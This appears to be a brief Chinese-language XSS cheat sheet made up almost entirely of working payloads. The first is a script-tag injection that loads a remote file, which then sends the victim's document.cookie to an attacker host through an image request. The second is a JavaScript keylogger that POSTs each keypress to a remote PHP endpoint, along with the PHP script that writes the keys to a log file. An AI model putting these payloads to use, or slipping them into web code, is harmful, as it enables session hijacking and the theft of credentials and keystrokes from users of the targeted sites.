
# xss

* 窃取cookie

* keylogger

* xsser

## 窃取cookie
```shell
    a. js
    <script src="http://1.1.1.1/a.js"></script>
    b. a.js源码
    var img = new Image();
    img.src="http://1.1.1.1/cookie?cookie="+document.cookie;
```

## keylogger
```shell 
    a. keylogger.js
    document.onkeypress=function(evt){
        evt = evt|| window.event
        key = String.fromCharCode(evt.charCode);
        if(key){
        var http = new XMLHttpRequest();
        var param = encodeURI(key);
        http.open("POST","http://192.168.20.8/keylogger.php",true);
        http.setRequestHeader("Content-type","application/x-www-from-urlencoded");
        http.send("key="+param); 
        }
    }
    b. keylogger.php
    <?php
        $key=$_POST['key'];
        $logfile="keylog.txt";
        $fp = fopen($logfile,"a");
        fwrite($fp,$key);
        fclose($fp);
    ?>
```
